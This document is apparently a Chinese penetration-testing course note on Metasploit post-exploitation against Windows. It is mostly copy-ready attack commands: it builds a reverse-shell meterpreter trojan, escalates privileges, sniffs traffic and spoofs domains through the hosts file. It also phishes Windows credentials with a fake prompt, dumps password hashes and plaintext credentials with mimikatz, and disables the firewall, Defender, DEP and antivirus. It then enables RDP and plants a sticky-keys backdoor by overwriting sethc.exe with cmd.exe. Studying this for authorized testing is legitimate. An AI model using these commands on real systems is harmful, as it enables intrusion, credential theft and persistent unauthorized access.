# 渗透测试基础11

# 系统防火墙原理以及突破（利用msf：对数据包进行嗅探、host注入-伪造域名、用户认证的钓鱼窗口、passTheHash获得操作系统用户密码hash值、使用猕猴桃获得用户密码、对防火墙相关操作、3389端口远程连接、植入后门、powershell的作用、粘滞键漏洞）



## 数据和嗅探：

目标电脑上msf运行木马后

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4444 -f exe -o msf.exe

use exploit/muti/handler

set payload windows/x64/meterpreter/reverse_tcp

show options

set lhost 192.168.1.120

exploit
```

提权

```
getuid
getsystem
getuid
```





### 对数据包的操作

进入session

```
load sniffer    # 加载嗅探模块

sniffer_interfaces     # 查看电脑网卡

sniffer_start 2      # 对2号网卡进行嗅探操作，监听

sniffer_dump 2 2.cap    # 把2号网卡的数据包下载下来保存为/root/2.cap

wireshark 2.cap    # 使用wireshark查看抓到的包

sniffer_stop 2    # 停止对2号网卡的嗅探
```



## host 注入——伪造域名

msf

提权到系统最高权限，

然后进行如下操作：

```
use post/windows/manage/inject_host   # 使用注入模块

show options

set IP [自己的ip]     # 这里的ip是之后目标指向的ip

set DOMAIN [要篡改的域名]    # 要伪造什么域名

set SESSION [session-id]    # 对哪个session-id进行修改

exploit
```

实质是修改了本机操控的木马所在电脑的host文件



## 用户认证钓鱼窗口

进入sesion中

```
run post/windows/gather/phish_windows_credentials
```

这个时候管理员的桌面会出现认证窗口（假的）

然后我们就可截获其用户名和密码。



## passTheHash:

必须是system权限
进入一个session

```
run post/windows/gather/hashdump    # 获得操作系统的用户hash值
```

即可以获取到管理员密码加密之后的密码，之后使用穷举的方法破解【使用彩虹表等】【或使用猕猴桃】



## 使用猕猴桃(32位)：

实质利用lsass.exe本地安全认证进程，达到获得用户登录密码。



连接木马：

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4444 -f exe -o msf.exe

use exploit/muti/handler

set payload windows/x64/meterpreter/reverse_tcp

show options

set lhost 192.168.1.120

exploit

getuid
getsystem
getuid
```



进入session加载猕猴桃：

```
load mimikatz(或load kiwi)   # 加载猕猴桃

help kiwi   # 查看猕猴桃的命令

creds_all    # 列出所有的凭据（得到LM,NTLM等即密码明文）

creds_kerberos     # 拿到所有密码

creds_msv     # 只列出当前用户加密之后的密码
```



**电脑版本的猕猴桃软件**：通过获取内存内容得到答案

扫雷外挂（Windows2003，Windows7）:

```
winmine::infos
```



## 防火墙和3389端口：

### 正常打开/关闭防火墙：

![image-20220110182225424](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220110182225424.png)

高级设置：

![image-20220110182306171](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220110182306171.png)



### 命令行打开/关闭防火墙

kali操纵木马对windows进行操作

```
shell   #进入到命令行到C:\Windows\system32目录下
```

```
whoami   #查看是否为系统权限
```



**关闭防火墙**

```
netsh advfirewall set allprofiles state off
```



**关闭defener**

```
net stop windefend
```



**关闭dep(数据执行保护)**

```
bcdedit.exe /set {current} nx AlwaysOff
```



**退出命令行返回到msf里**：

```
exit
```

回到meterpreter的木马里



**关闭杀毒软件**

```
run killav

(run post/windows/manage/killav)
```

大多数关闭国外杀毒软件



### 关于远程连接——在木马被杀掉后能有后门进行连接

一般情况：

![image-20220110183128454](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220110183128454.png)

可以看到目标主机上cmd后

```
netstat -ano    # 查看端口状态
# 会发现3389端口未打开
```



**开启远程桌面(3389)**

```
run post/windows/manage/enable_rdp   # 开启远程桌面

run getgui -e    # 开启远程桌面（不太靠谱）

run getgui -u 用户名 -p 密码    

run getgui -e -f 8888    # 开启远程桌面并且绑定在8888端口上
```

指定端口：

![image-20220110183822328](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220110183822328.png)



关于恢复原样：

![image-20220110183513964](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220110183513964.png)

![image-20220110183550212](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220110183550212.png)



**kali图形界面上使用远程桌面**

```
rdesktop -u [用户名] -p [密码] [目标ip]
```



**关于截图**：

msf

```
load espia  # 加载截图插件

screengrab   # 截图
```



## 后门植入：

之前新建的木马可以通过结束进程后放入回收站，即可删除木马。

`meterpreter shell` 运行是在内存中的，重启即消失。

所以需要植入后门。



如果拿到了对方的powershell权限，那么可以做：

1. 卸载对方的补丁

2. 给对方安装一些有漏洞的软件（比如说ftp程序，输入法等等）【蓝奏云里的：小ftp，然后打开浏览器访问即可打开文件夹】

   ![image-20220110184953481](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220110184953481.png)

3. 考虑粘滞键漏洞：

   ```
   粘滞键地址在c:\windows\system32\sethc
   ```

   按5下shift键，即可召唤出来。

   

   桌面新建一个x.bat

   ```
   takeown /f c:\windows\system32\sethc.* /a /r /d y  
   # 获得其控制权
   cacls c:\windows\system32\sethc.exe /T /E /G system:F  
   # 修改控制权
   cacls c:\windows\system32\sethc.exe /T /E /G administrator:F
   # 修改控制权
   copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe /y
   # 替换sethc
   ```

   按5下shift键，即可召唤出修改后的cmd

   可在未登录下召唤出来，然后得到密码

   ![image-20220110185730824](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220110185730824.png)

   

   普通状态是登录者的权限，如果是要登录的状态召唤出漏洞就是system权限

   

   

